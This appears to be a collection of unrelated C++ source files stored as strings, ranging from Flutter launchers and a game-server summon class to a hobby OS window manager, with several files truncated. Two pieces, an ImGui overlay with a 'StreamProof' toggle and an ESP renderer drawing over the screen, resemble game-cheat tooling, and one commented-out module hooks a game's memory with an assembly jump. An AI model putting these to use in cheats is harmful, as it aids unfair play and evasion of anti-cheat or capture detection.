    "#include \"Includes.h\"\n\nHINSTANCE Overlay::hInstance = nullptr;\n\nINT APIENTRY WinMain(\n\t_In_ HINSTANCE hInstance,\n\t_In_opt_ HINSTANCE hPrevInstance,\n\t_In_ PSTR lpCommandLine,\n\t_In_ INT nCmdShow\n) {\n\tOverlay::hInstance = hInstance;\n\n\tconst auto fnGetParentWindow = [ ] ( ) {\n\t\treturn FindWindowA( \"SOME_PARENT_WINDOW_CLASS_NAME\", \"SOME_PARENT_WINDOW_NAME\" );\n\t};\n\n\tconst HWND hParentWindow = fnGetParentWindow( );\n\tconst Overlay overlay = Overlay( L\"SAMPLE_CLASS_NAME\", L\"SAMPLE_WINDOW_NAME\" );\n\n\tif ( !overlay.Init( hParentWindow ) ) {\n\t\toverlay.Destroy( );\n\n\t\treturn 0;\n\t}\n\n\toverlay.Start( [ ] ( Overlay* pOverlay ) {\n\t\tstatic bool Open = true;\n\t\tstatic bool StreamProof = true;\n\n\t\tif ( GetAsyncKeyState( VK_INSERT ) & SHRT_MAX )\n\t\t\tOpen = !Open;\n\n\t\tpOverlay->SetAbortInput( Open );\n\t\tpOverlay->SetStreamProof( StreamProof );\n\n\t\tif ( !Open )\n\t\t\treturn;\n\n\t\tImGui::Begin( \"Sample\" );\n\t\t{\n\t\t\tImGui::Checkbox( \"StreamProof\", &StreamProof );\n\t\t}\n\t\tImGui::End( );\n\t} );\n\n\twhile ( true ) { Sleep( INT_MAX ); } // sleep so our app doesn't just exit....\n\n\treturn 0;\n};\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"fast_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "class Solution {\n  public:\n    Node* sortedMerge(Node* head1, Node* head2) {\n        // code here\n        Node* start=new Node(-1);\n        Node* temp=start;\n        \n        while(head1!=nullptr && head2!=nullptr){\n            if(head1->data < head2->data){\n                temp->next=head1;\n                head1=head1->next;\n            } else {\n                temp->next=head2;\n                head2=head2->next;\n            }\n            temp=temp->next;\n            \n        }\n        if(head1!=nullptr) temp->next=head1;\n        if(head2!=nullptr) temp->next=head2;\n        \n        return start->next;\n    }\n};\n\n\n/* Link list Node\nstruct Node {\n  int data;\n  struct Node *next;\n\n  Node(int x) {\n    data = x;\n    next = NULL;\n  }\n};\n*/\n\n\n\n/*\nclass Solution {\n  public:\n    Node* sortedMerge(Node* head1, Node* head2) {\n        // code here\n        // Node* start=new Node(-1);\n        //Node* temp=start;\n      \n        \n        Node *newHead=nullptr;\n         Node* temp=newHead;\n        if(head1->data<head2->data){\n            newHead=head1;\n            head1=newHead->next;\n        }else {\n            newHead=head2;\n            head2=newHead->next;\n        }\n        temp=newHead;\n        \n        while(head1!=nullptr && head2!=nullptr){\n            if(head1->data < head2->data){\n                temp->next=head1;\n                head1=head1->next;\n            } else {\n                temp->next=head2;\n                head2=head2->next;\n            }\n            temp=temp->next;\n            \n        }\n        if(head1!=nullptr) temp->next=head1;\n        if(head2!=nullptr) temp->next=head2;\n        \n        // return start->next;\n        return newHead;\n    }\n};\n*/\n",
    "/*\n#include \"scripting.hpp\"\n#include \"utils/memory.hpp\"\n\nnamespace dfbhdx::components\n{\n\tvoid scripting::execute_init_callbacks()\n\t{\n\t\tfor (auto& init_callback : _init_callbacks)\n\t\t{\n\t\t\tinit_callback();\n\t\t}\n\t}\n\n\t__declspec(naked) void on_init_hook()\n\t{\n\t\t__asm\n\t\t{\n\t\t\tcall scripting::execute_init_callbacks\n\t\t\tpush ebp\n\t\t\tmov ebp, esp\n\t\t\tsub esp, 0x914\n\t\t\tpush 0x4B9469\n\t\t\tretn\n\t\t}\n\t}\n\n\tvoid scripting::execute_on_frame_callbacks()\n\t{\n\t\tfor (auto& on_frame_callback : _on_frame_callbacks)\n\t\t{\n\t\t\ton_frame_callback();\n\t\t}\n\t}\n\n\t__declspec(naked) void on_frame_hook()\n\t{\n\t\t__asm\n\t\t{\n\t\t\tcall scripting::execute_on_frame_callbacks\n\t\t\t// Finish hook\n\t\t}\n\t}\n\n\tvoid scripting::load()\n\t{\n\t\tsetup_state();\n\n\t\tutils::memory::jump(0x4B9460, on_init_hook);\n\t\t//utils::memory::jump(0x0, on_frame_hook);\n\n\t\tload_scripts();\n\t\texecute_scripts();\n\t}\n\n\tvoid scripting::unload()\n\t{\n\n\t}\n\n\tvoid scripting::load_scripts()\n\t{\n\t\tif (!std::filesystem::exists(\"scripts\") || !std::filesystem::is_directory(\"scripts\"))\n\t\t{\n\t\t\treturn;\n\t\t}\n\n\t\tfor (const auto& entry : std::filesystem::recursive_directory_iterator{ \"scripts\" })\n\t\t{\n\t\t\tif (!entry.is_regular_file())\n\t\t\t{\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tauto& path = entry.path();\n\n\t\t\tif (path.has_extension() && path.extension() == \".lua\")\n\t\t\t{\n\t\t\t\tSPDLOG_DEBUG(\"Found script: {}\", path.string());\n\t\t\t\t_scripts.push_back(path.string());\n\t\t\t}\n\t\t}\n\n\t\tSPDLOG_INFO(\"Loaded {} script(s)\", _scripts.size());\n\t}\n\n\tvoid scripting::clear_scripts()\n\t{\n\t\t_scripts.clear();\n\t}\n\n\tvoid scripting::reload_scripts()\n\t{\n\t\tclear_scripts();\n\t\tload_scripts();\n\t}\n\n\tvoid scripting::execute_scripts()\n\t{\n\t\tfor (const auto& script : _scripts)\n\t\t{\n\t\t\t_lua.script_file(script);\n\t\t}\n\t}\n\n\tvoid scripting::setup_state()\n\t{\n\t\t_lua.set_function(\"test\", [](int a, int b)\n\t\t\t{\n\t\t\t\tSPDLOG_DEBUG(\"{} {}\", a, b);\n\t\t\t});\n\t\t_lua.set_function(\"registerInit\", [&](sol::function f)\n\t\t\t{\n\t\t\t\t_init_callbacks.push_back(f);\n\t\t\t});\n\t\t_lua.set_function(\"registerOnFrame\", [&](sol::function f)\n\t\t\t{\n\t\t\t\t_on_frame_callbacks.push_back(f);\n\t\t\t});\n\t}\n}\n*/",
    "#include \"../include/render.h\"\n#include \"../include/overlay.h\"\n#include \"../include/esp_renderer.h\"\n\nnamespace RenderResources {\n    HDC hdcMem = NULL;\n    HBITMAP hbmAlpha = NULL;\n    HBITMAP hbmOld = NULL;\n    void* pvBits = nullptr;\n    SIZE screenSize = { 0, 0 };\n    BLENDFUNCTION blend = { 0 };\n    bool initialized = false;\n    HDC hdcScreen = NULL;\n\n    POINT ptSrc = { 0, 0 };\n    POINT ptDst = { 0, 0 };\n\n    void Initialize() {\n        if (!initialized) {\n            hdcScreen = GetDC(NULL);\n\n            hdcMem = CreateCompatibleDC(hdcScreen);\n\n            BITMAPINFO bmi = { 0 };\n            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);\n            bmi.bmiHeader.biWidth = GetSystemMetrics(SM_CXSCREEN);\n            bmi.bmiHeader.biHeight = -GetSystemMetrics(SM_CYSCREEN);\n            bmi.bmiHeader.biPlanes = 1;\n            bmi.bmiHeader.biBitCount = 32;\n            bmi.bmiHeader.biCompression = BI_RGB;\n\n            screenSize = { GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN) };\n\n            hbmAlpha = CreateDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &pvBits, NULL, 0);\n\n            memset(pvBits, 0, screenSize.cx * screenSize.cy * 4);\n\n            blend.BlendOp = AC_SRC_OVER;\n            blend.BlendFlags = 0;\n            blend.SourceConstantAlpha = 255;\n            blend.AlphaFormat = AC_SRC_ALPHA;\n\n            if (hbmAlpha == NULL) {\n                return;\n            }\n            hbmOld = (HBITMAP)SelectObject(hdcMem, hbmAlpha);\n            initialized = true;\n\n        }\n    }\n\n    void Cleanup() {\n        if (initialized) {\n            SelectObject(hdcMem, hbmOld);\n            DeleteObject(hbmAlpha);\n            DeleteDC(hdcMem);\n            ReleaseDC(NULL, hdcScreen);\n\n            initialized = false;\n        }\n    }\n}\n\nvoid Render(HWND hwnd) {\n    RenderResources::Initialize();\n\n    ESPRenderer::RenderESP(RenderResources::pvBits);\n\n    UpdateLayeredWindow(hwnd, RenderResources::hdcScreen, &RenderResources::ptDst,\n        &RenderResources::screenSize, RenderResources::hdcMem,\n        &RenderResources::ptSrc, RGB(0, 0, 0),\n        &RenderResources::blend, ULW_ALPHA);\n}\n\nvoid CleanupRender() {\n    RenderResources::Cleanup();\n}\n\n\nvoid DrawRedSquare(void* pvBits)\n{\n    int width = 100;\n    int height = 100;\n    int x = (GetSystemMetrics(SM_CXSCREEN) / 2) - (width / 2);\n    int y = (GetSystemMetrics(SM_CYSCREEN) / 2) - (height / 2);\n    for (int i = 0; i < height; ++i) {\n        for (int j = 0; j < width; ++j) {\n            ((DWORD*)pvBits)[(y + i) * GetSystemMetrics(SM_CXSCREEN) + (x + j)] = 0xFFFF0000;\n        }\n    }\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dock\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <filesystem>\r\n#include <string>\r\n\r\nnamespace fs = std::filesystem;\r\n\r\nvoid organize_files(const std::string& source_dir, const std::string& target_dir, const std::string& file_extension) {\r\n    try {\r\n        // Check if target directory exists, if not create it\r\n        if (!fs::exists(target_dir)) {\r\n            fs::create_directory(target_dir);\r\n        }\r\n\r\n        for (const auto& entry : fs::directory_iterator(source_dir)) {\r\n            if (entry.is_regular_file() && entry.path().extension() == file_extension) {\r\n                fs::path target_path = target_dir / entry.path().filename();\r\n                fs::rename(entry.path(), target_path);\r\n                std::cout << \"Moved: \" << entry.path() << \" to \" << target_path << std::endl;\r\n            }\r\n        }\r\n    } catch (const fs::filesystem_error& e) {\r\n        std::cerr << \"Error: \" << e.what() << std::endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    std::string source_dir = \"path/to/source_directory\";\r\n    std::string target_dir = \"path/to/target_directory\";\r\n    std::string file_extension = \".txt\"; // Change to the file extension you want to organize\r\n\r\n    organize_files(source_dir, target_dir, file_extension);\r\n\r\n    return 0;\r\n}\r\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "// Pinscape Pico - Plunger Calibration Window\n// Copyright 2024, 2025 Michael J Roberts / BSD-3-Clause license / NO WARRANTY\n\n\n#include <stdlib.h>\n#include <stdint.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <math.h>\n#include <list>\n#include <iterator>\n#include <memory>\n#include <algorithm>\n#include <Windows.h>\n#include <windowsx.h>\n#include <Uxtheme.h>\n#include <CommCtrl.h>\n#include <tchar.h>\n#include \"PinscapePicoAPI.h\"\n#include \"WinUtil.h\"\n#include \"Utilities.h\"\n#include \"PlungerCalWin.h\"\n#include \"resource.h\"\n\n// the window class is part of the PinscapePico namespace\nusing namespace PinscapePico;\n\nPlungerCalWin::Factory::FeedbackDeviceList PlungerCalWin::Factory::FilterDevices(const FeedbackDeviceList list)\n{\n\t// get the sublist of items with plungers configured\n\tusing Desc = PinscapePico::FeedbackControllerInterface::Desc;\n\tFeedbackDeviceList withPlunger;\n\tstd::copy_if(list.begin(), list.end(), std::back_inserter(withPlunger), [](const Desc &desc) {\n\t\treturn desc.plungerType != PinscapePico::FeedbackControllerReport::PLUNGER_NONE; });\n\n\t// return the filtered list\n\treturn withPlunger;\n}\n\nPlungerCalWin::PlungerCalWin(HINSTANCE hInstance, std::shared_ptr<VendorInterface::Shared> &device) :\n\tDeviceThreadWindow(hInstance, device, new UpdaterThread())\n{\n\t// Load my menu bar and accelerator\n\thMenuBar = LoadMenu(hInstance, MAKEINTRESOURCE(ID_MENU_PLUNGERWIN));\n\thAccel = LoadAccelerators(hInstance, MAKEINTRESOURCE(ID_ACCEL_DEVICEWIN));\n\n\t// query device information\n\tQueryDeviceInfo();\n}\n\nPlungerCalWin::~PlungerCalWin()\n{\n\t// Before we exit, revert in-memory settings on the device to the\n\t// last saved settings.  This provides a more document-like model for\n\t// the user, by making the settings in the window act like the working\n\t// copy of a document in a traditional Windows program.  When closing\n\t// a window with unsaved changes in a traditional application, the\n\t// unsaved changes are discarded (after asking the user to confirm\n\t// that this is okay, which we also do here).  \n\tauto &dev = updaterThread->device;\n\tif (VendorInterface::Shared::Locker l(dev); l.locked)\n\t\tdev->device->RevertPlungerSettings();\n}\n\nvoid PlungerCalWin::OnEraseDeviceConfig(bool factoryReset)\n{\n\t// re-query the device information\n\tQueryDeviceInfo();\n\n\t// reset UI controls to the updated/erased device settings\n\tInitControls();\n\tlastCalDataValid = false;\n}\n\n\nbool PlungerCalWin::OnDeviceReconnect()\n{\n\t// remember the old plunger type, and re-query the device information\n\tauto oldSensorType = sensorType;\n\tQueryDeviceInfo();\n\n\t// Sync settings on the device with the UI.  This provides a document-like\n\t// model for the user, in that changes made in the UI remain in effect as\n\t// long as the window is open.  With a standard document model, the working\n\t// copy viewed and edited through the UI would be in local memory, but in\n\t// this case we have a weird distributed setup where the \"document\" contents\n\t// are also stored in working memory on the Pico.  Resetting the Pico makes\n\t// it forget the old memory contents, which is why we have to explicitly\n\t// restore the UI settings here, to get the Pico's copy of the working\n\t// in-memory document back in sync with the UI.\n\t//\n\t// Only do this if the plunger type didn't change.  If the plunger type\n\t// changed since we last checked, it's better to forget the old settings,\n\t// since the various sensors have different enough characteristics that\n\t// the settings have to be fine-tuned to the particular setup.  That's\n\t// really the whole point of these settings in the first place, to\n\t// optimize for the installed sensor's response characteristics and the\n\t// physical install environment.\n\tif (sensorType == oldSensorType)\n\t{\n\t\t// no sensor type change - carry over the old settings\n\t\tjitter.SendToDevice(this);\n\t\tfiringTime.SendToDevice(this);\n\t\tintegrationTime.SendToDevice(this);\n\t\tscalingFactor.SendToDevice(this);\n\t\treverseOrientation.SendToDevice(this);\n\t\tscanMode.SendToDevice(this);\n\n\t\t// if we captured a calibration, restore it\n\t\tif (lastCalDataValid && !lastCalDataPending)\n\t\t{\n\t\t\tif (VendorInterface::Shared::Locker l(updaterThread->device); l.locked)\n\t\t\t\tupdaterThread->device->device->SetPlungerCalibrationData(&lastCalData, sizeof(lastCalData));\n\t\t}\n\n\t\t// Clear the calibration-pending flag, in case the device reset\n\t\t// while a calibration was in progress - we don't need to wait\n\t\t// for it any longer.\n\t\tlastCalDataPending = false;\n\t}\n\telse\n\t{\n\t\t// sensor type changed - reinitialize the UI settings from the\n\t\t// current settings on the device\n\t\tInitControls();\n\t\tlastCalDataValid = false;\n\t}\n\n\t// tell the container that we've refreshed, so it can keep the window open\n\treturn true;\n}\n\n\nvoid PlungerCalWin::QueryDeviceInfo()\n{\n\t// query the plunger configuration, and look up the plunger sensor display name\n\tauto &device = updaterThread->device;\n\tif (VendorInterface::Shared::Locker l(device); l.locked)\n\t{\n\t\tif (device->device->QueryPlungerConfig(plungerConfig) == PinscapeResponse::OK)\n\t\t{\n\t\t\t//",
    "/*\n * This file is part of the TrinityCore Project. See AUTHORS file for Copyright information\n *\n * This program is free software; you can redistribute it and/or modify it\n * under the terms of the GNU General Public License as published by the\n * Free Software Foundation; either version 2 of the License, or (at your\n * option) any later version.\n *\n * This program is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for\n * more details.\n *\n * You should have received a copy of the GNU General Public License along\n * with this program. If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"TemporarySummon.h\"\n#include \"CellImpl.h\"\n#include \"CreatureAI.h\"\n#include \"DB2Structure.h\"\n#include \"GameObject.h\"\n#include \"GameObjectAI.h\"\n#include \"GridNotifiers.h\"\n#include \"Log.h\"\n#include \"Map.h\"\n#include \"ObjectAccessor.h\"\n#include \"Pet.h\"\n#include \"Player.h\"\n#include \"SmoothPhasing.h\"\n#include <boost/container/small_vector.hpp>\n#include <sstream>\n\nTempSummon::TempSummon(SummonPropertiesEntry const* properties, WorldObject* owner, bool isWorldObject) :\nCreature(isWorldObject), m_Properties(properties), m_type(TEMPSUMMON_MANUAL_DESPAWN),\nm_timer(0), m_lifetime(0), m_canFollowOwner(true)\n{\n    if (owner)\n        m_summonerGUID = owner->GetGUID();\n\n    m_unitTypeMask |= UNIT_MASK_SUMMON;\n}\n\nWorldObject* TempSummon::GetSummoner() const\n{\n    return !m_summonerGUID.IsEmpty() ? ObjectAccessor::GetWorldObject(*this, m_summonerGUID) : nullptr;\n}\n\nUnit* TempSummon::GetSummonerUnit() const\n{\n    if (WorldObject* summoner = GetSummoner())\n        return summoner->ToUnit();\n    return nullptr;\n}\n\nCreature* TempSummon::GetSummonerCreatureBase() const\n{\n    return !m_summonerGUID.IsEmpty() ? ObjectAccessor::GetCreature(*this, m_summonerGUID) : nullptr;\n}\n\nGameObject* TempSummon::GetSummonerGameObject() const\n{\n    if (WorldObject* summoner = GetSummoner())\n        return summoner->ToGameObject();\n    return nullptr;\n}\n\nvoid TempSummon::Update(uint32 diff)\n{\n    Creature::Update(diff);\n\n    if (m_deathState == DEAD)\n    {\n        UnSummon();\n        return;\n    }\n    switch (m_type)\n    {\n        case TEMPSUMMON_MANUAL_DESPAWN:\n        case TEMPSUMMON_DEAD_DESPAWN:\n            break;\n        case TEMPSUMMON_TIMED_DESPAWN:\n        {\n            if (m_timer <= diff)\n            {\n                UnSummon();\n                return;\n            }\n\n            m_timer -= diff;\n            break;\n        }\n        case TEMPSUMMON_TIMED_DESPAWN_OUT_OF_COMBAT:\n        {\n            if (!IsInCombat())\n            {\n                if (m_timer <= diff)\n                {\n                    UnSummon();\n                    return;\n                }\n\n                m_timer -= diff;\n            }\n            else if (m_timer != m_lifetime)\n                m_timer = m_lifetime;\n\n            break;\n        }\n\n        case TEMPSUMMON_CORPSE_TIMED_DESPAWN:\n        {\n            if (m_deathState == CORPSE)\n            {\n                if (m_timer <= diff)\n                {\n                    UnSummon();\n                    return;\n                }\n\n                m_timer -= diff;\n            }\n            break;\n        }\n        case TEMPSUMMON_CORPSE_DESPAWN:\n        {\n            // if m_deathState is DEAD, CORPSE was skipped\n            if (m_deathState == CORPSE)\n            {\n                UnSummon();\n                return;\n            }\n\n            break;\n        }\n        case TEMPSUMMON_TIMED_OR_CORPSE_DESPAWN:\n        {\n            if (m_deathState == CORPSE)\n            {\n                UnSummon();\n                return;\n            }\n\n            if (!IsInCombat())\n            {\n                if (m_timer <= diff)\n                {\n                    UnSummon();\n                    return;\n                }\n                else\n                    m_timer -= diff;\n            }\n            else if (m_timer != m_lifetime)\n                m_timer = m_lifetime;\n            break;\n        }\n        case TEMPSUMMON_TIMED_OR_DEAD_DESPAWN:\n        {\n            if (!IsInCombat() && IsAlive())\n            {\n                if (m_timer <= diff)\n                {\n                    UnSummon();\n                    return;\n                }\n                else\n                    m_timer -= diff;\n            }\n            else if (m_timer != m_lifetime)\n                m_timer = m_lifetime;\n            break;\n        }\n        default:\n            UnSummon();\n            TC_LOG_ERROR(\"entities.unit\", \"Temporary summoned creature (entry: %u) have unknown type %u of \", GetEntry(), m_type);\n            break;\n    }\n}\n\nvoid TempSummon::InitStats(uint32 duration)\n{\n    ASSERT(!IsPet());\n\n    m_timer = duration;\n    m_lifetime = duration;\n\n    if (m_type == TEMPSUMMON_MANUAL_DESPAWN)\n        m_type = (duration == 0) ? TEMPSUMMON_DEAD_DESPAWN : TEMPSUMMON_TIMED_DESPAWN;\n\n    Unit* ow",
    "#include \"awm.h\"\r\n#include <drivers/userinput/mouse/mouse.h>\r\n#include <drivers/userinput/keyboard/keyboard.h>\r\n#include <drivers/scheduling/PIT.h>\r\n#include <cstr.h>\r\n#include <arch/x86/memory/heap.h>\r\n#include <arch/x86/memory/memory.h>\r\n\r\nuint8_t MousePointerBitmap[] = {\r\n    0b10000000, 0b00000000, \r\n    0b11000000, 0b00000000, \r\n    0b11100000, 0b00000000, \r\n    0b11110000, 0b00000000, \r\n    0b11111000, 0b00000000, \r\n    0b11111100, 0b00000000, \r\n    0b11111110, 0b00000000, \r\n    0b11111111, 0b00000000, \r\n    0b11111111, 0b10000000, \r\n    0b11111111, 0b11000000, \r\n    0b11111111, 0b11100000, \r\n    0b11111111, 0b11110000, \r\n    0b11111000, 0b00000000, \r\n    0b11110000, 0b00000000, \r\n    0b11100000, 0b00000000, \r\n    0b11000000, 0b00000000, \r\n};\r\n\r\nclass WindowDefaultStyle {\r\n    public:\r\n    uint64_t\r\n        WindowBorder                = 0x414559,\r\n        WindowTitleBar              = 0x232634,\r\n        WindowTitleBarActive        = 0x303446,\r\n        TitleBarText                = 0xc6d0f5,\r\n        TitleBarTextUnactive        = 0x414559,\r\n        WindowBackground            = 0x232634,\r\n\r\n        Close                       = 0xe78284,\r\n        CloseHovered                = 0xea999c,\r\n        ClosePressed                = 0xb36566,\r\n\r\n        Maximize                    = 0x292c3c, // 0xa6d189\r\n        MaximizeHovered             = 0x292c3c,\r\n        MaximizePressed             = 0x292c3c,\r\n\r\n        Minimize                    = 0x292c3c, // 0xe5c890\r\n        MinimizeHovered             = 0x292c3c,\r\n        MinimizePressed             = 0x292c3c,\r\n\r\n        InactiveButton              = 0x232634;\r\n};\r\n\r\nWindowDefaultStyle wds;\r\nAtlasWindowManager* awm;\r\n\r\nbool ShowWindowContext = false;\r\nbool ShowWindowContextPointOfView = false;\r\n\r\ndouble LastFrameTime = 0;    // Time of the last frame\r\nuint64_t FrameCount = 0;  